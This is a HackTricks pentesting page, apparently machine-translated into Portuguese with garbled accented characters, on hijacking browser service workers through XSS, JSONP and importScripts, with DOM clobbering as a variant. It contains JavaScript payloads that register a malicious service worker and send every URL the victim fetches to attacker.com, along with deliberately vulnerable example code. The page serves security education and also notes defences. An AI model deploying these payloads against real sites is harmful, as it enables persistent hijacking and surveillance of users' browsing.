# Abusing Service Workers

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Um **service worker** √© um script executado pelo seu navegador em segundo plano, separado de qualquer p√°gina da web, permitindo recursos que n√£o requerem uma p√°gina da web ou intera√ß√£o do usu√°rio, melhorando assim as capacidades de **processamento offline e em segundo plano**. Informa√ß√µes detalhadas sobre service workers podem ser encontradas [aqui](https://developers.google.com/web/fundamentals/primers/service-workers). Ao explorar service workers dentro de um dom√≠nio web vulner√°vel, os atacantes podem obter controle sobre as intera√ß√µes da v√≠tima com todas as p√°ginas dentro desse dom√≠nio.

### Checking for Existing Service Workers

Os service workers existentes podem ser verificados na se√ß√£o **Service Workers** da aba **Application** nas **Developer Tools**. Outro m√©todo √© visitar [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) para uma vis√£o mais detalhada.

### Push Notifications

As **permiss√µes de notifica√ß√£o push** impactam diretamente a capacidade de um **service worker** de se comunicar com o servidor sem intera√ß√£o direta do usu√°rio. Se as permiss√µes forem negadas, isso limita o potencial do service worker de representar uma amea√ßa cont√≠nua. Por outro lado, conceder permiss√µes aumenta os riscos de seguran√ßa ao permitir a recep√ß√£o e execu√ß√£o de poss√≠veis exploits.

## Attack Creating a Service Worker

Para explorar essa vulnerabilidade, voc√™ precisa encontrar:

* Uma maneira de **carregar arquivos JS arbitr√°rios** no servidor e um **XSS para carregar o service worker** do arquivo JS carregado
* Um **pedido JSONP vulner√°vel** onde voc√™ pode **manipular a sa√≠da (com c√≥digo JS arbitr√°rio)** e um **XSS** para **carregar o JSONP com um payload** que ir√° **carregar um service worker malicioso**.

No exemplo a seguir, vou apresentar um c√≥digo para **registrar um novo service worker** que ir√° escutar o evento `fetch` e **enviar para o servidor dos atacantes cada URL buscada** (este √© o c√≥digo que voc√™ precisaria **carregar** no **servidor** ou carregar via uma **resposta JSONP vulner√°vel**):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
E este √© o c√≥digo que ir√° **registrar o trabalhador** (o c√≥digo que voc√™ deve ser capaz de executar abusando de um **XSS**). Neste caso, uma solicita√ß√£o **GET** ser√° enviada para o servidor dos **atacantes** **notificando** se o **registro** do trabalhador de servi√ßo foi bem-sucedido ou n√£o:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
No caso de abusar de um endpoint JSONP vulner√°vel, voc√™ deve colocar o valor dentro de `var sw`. Por exemplo:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
H√° um **C2** dedicado √† **explora√ß√£o de Service Workers** chamado [**Shadow Workers**](https://shadow-workers.github.io) que ser√° muito √∫til para abusar dessas vulnerabilidades.

A **diretiva de cache de 24 horas** limita a vida de um **service worker (SW)** malicioso ou comprometido a no m√°ximo 24 horas ap√≥s a corre√ß√£o de uma vulnerabilidade XSS, assumindo o status de cliente online. Para minimizar a vulnerabilidade, os operadores do site podem reduzir o Tempo de Vida (TTL) do script SW. Os desenvolvedores tamb√©m s√£o aconselhados a criar um [**kill-switch para service worker**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) para desativa√ß√£o r√°pida.

## Abusando de `importScripts` em um SW via DOM Clobbering

A fun√ß√£o **`importScripts`** chamada de um Service Worker pode **importar um script de um dom√≠nio diferente**. Se essa fun√ß√£o for chamada usando um **par√¢metro que um atacante poderia** modificar, ele seria capaz de **importar um script JS de seu dom√≠nio** e obter XSS.

**Isso at√© contorna as prote√ß√µes CSP.**

**Exemplo de c√≥digo vulner√°vel:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Com DOM Clobbering

Para mais informa√ß√µes sobre o que √© DOM Clobbering, confira:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Se a URL/dom√≠nio que o SW est√° usando para chamar **`importScripts`** estiver **dentro de um elemento HTML**, √© **poss√≠vel modific√°-lo via DOM Clobbering** para fazer o SW **carregar um script do seu pr√≥prio dom√≠nio**.

Para um exemplo disso, confira o link de refer√™ncia.

## Refer√™ncias

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
